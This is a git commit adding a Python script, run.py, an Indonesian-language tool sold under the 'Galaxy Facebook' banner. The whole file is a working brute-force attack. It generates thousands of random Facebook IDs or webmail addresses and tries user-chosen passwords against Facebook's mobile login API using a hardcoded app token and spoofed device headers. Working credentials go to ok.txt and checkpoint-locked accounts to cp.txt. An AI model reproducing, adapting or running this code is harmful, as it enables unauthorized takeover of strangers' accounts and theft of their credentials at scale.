06483f6f97e646ec9d4f68d8b369085449858c03
Rana Nadeem Rajput <83763359+Rananadeem5214@users.noreply.github.com>
2021-11-10 20:29:41 +0500

    Add files via upload

---
+++ run.py
@@ -0,0 +1,216 @@
+# -*- coding: utf-8
+import os
+try:
+	import requests
+except ImportError:
+	print("\n [!] \033[0;91mmodule requests belum terinstall \033[0;97m")
+	os.system("pip install requests")
+
+try:
+	import concurrent.futures
+except ImportError:
+	print("\n [!] \033[0;91mmodule futures belum terinstall\033[0;97m")
+	os.system("pip install futures")
+
+import os
+import sys
+import time
+import requests
+import random
+from concurrent.futures import ThreadPoolExecutor
+
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		self.ips = requests.get("http://13.93.153.143/~anggakurniawan/myip/").text
+		os.system("clear")
+		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
+		print(" [*] Author  : Angga Kurniawan") 
+		print(" [*] GitHub  : https://github.com/anggaxd") 
+		print(" [#] -------------------------------------") 
+		print(" [*] FB      : https://fb.com/gaaaarzxd") 
+		print(" [*] IP      : %s"%(self.ips)) 
+		print("\n [1]. crack random id fb baru")
+		print(" [2]. crack random id fb muda")
+		print(" [3]. crack random id fb tua")
+		print(" [4]. crack random email fb")
+		tanya = input("\n [?] pilih : ")
+		if tanya in ["", " "]:
+			Main()
+		elif tanya in ["1", "01"]:
+			self.fbbaru()
+		elif tanya in ["2", "02"]:
+			self.fbmuda()
+		elif tanya in ["3", "03"]:
+			self.fbtua()
+		elif tanya in ["4", "04"]:
+			self.email()
+		else:
+			Main()
+
+	def fbbaru(self):
+		x = 11111111111
+		xx = 77777777777
+		idx = "1000" 
+		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
+				listpass = input(" [?] masukan kata sandi : ")
+				if len(listpass)<=5:
+					exit("\n [!] kata sandi minimal 6 karakter")
+				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n [+] hasil ok tersimpan di -> ok.txt")
+				print(" [+] hasil cp tersimpan di -> cp.txt")
+				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n [#] crack selesai...")
+		except Exception as e:exit(str(e))
+	
+	def fbmuda(self):
+		x = 1111111111
+		xx = 9999999999
+		idx = "10000" 
+		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
+				listpass = input(" [?] masukan kata sandi : ")
+				if len(listpass)<=5:
+					exit("\n [!] kata sandi minimal 6 karakter")
+				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n [+] hasil ok tersimpan di -> ok.txt")
+				print(" [+] hasil cp tersimpan di -> cp.txt")
+				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n [#] crack selesai...")
+		except Exception as e:exit(str(e))
+
+	def fbtua(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000" 
+		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
+				listpass = input(" [?] masukan kata sandi : ")
+				if len(listpass)<=5:
+					exit("\n [!] kata sandi minimal 6 karakter")
+				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n [+] hasil ok tersimpan di -> ok.txt")
+				print(" [+] hasil cp tersimpan di -> cp.txt")
+				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n [#] crack selesai...")
+		except Exception as e:exit(str(e))
+
+	def email(self):
+		x = 111
+		xx = 999
+		nama = input(" [?] masukan nama (cth: angga): ")
+		nama = nama.replace(" ", "")
+		domain = input(" [?] [G]mail.com, [Y]ahoo.com, [H]otmail.com : ")
+		if domain in [""]:Main()
+		elif domain in ["G", "g"]:
+			idx = "@gmail.com"
+		elif domain in ["Y", "y"]:
+			idx = "@yahoo.com"
+		elif domain in ["H", "h"]:
+			idx = "@hotmail.com"
+		else:Main()
+		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				___ = nama
+				self.id.append(___+str(_)+__)
+			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
+				listpass = input(" [?] masukan kata sandi : ")
+				if len(listpass)<=5:
+					exit("\n [!] kata sandi minimal 6 karakter")
+				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n [+] hasil ok tersimpan di -> ok.txt")
+				print(" [+] hasil cp tersimpan di -> cp.txt")
+				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n [#] crack selesai...")
+		except Exception as e:exit(str(e))
+
+	def api(self, uid, pwx):
+		ua = random.choice([
+			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+		])
+		sys.stdout.write(
+			"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
+		); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r  \033[0;92m* --> %s|%s\033[0;97m         "%(uid, pw))
+				self.ok.append("%s|%s"%(uid, pw))
+				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r  \033[0;93m* --> %s|%s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
+				break
+			else:
+				continue
+
+		self.loop +=1
+
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--info":
+		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
+		print("\n [*] Author    : Angga Kurniawan")
+		print(" [*] Team      : XNSCODE\n")
+		print(" [ Sosial Media Saya ] \n")
+		print(" [*] Facebook  : https://facebook.com/gaaaarzxd")
+		print(" [*] Instagram : https://instagram.com/gaaaarzxd")
+		print(" [*] YouTube   : https://youtube.com/anggakurniawanxd")
+		exit(" [*] GitHub    : https://github.com/anggaxd")
+	else:
+		Main()
+
+try:Main()
+except Exception as e:exit(str(e))
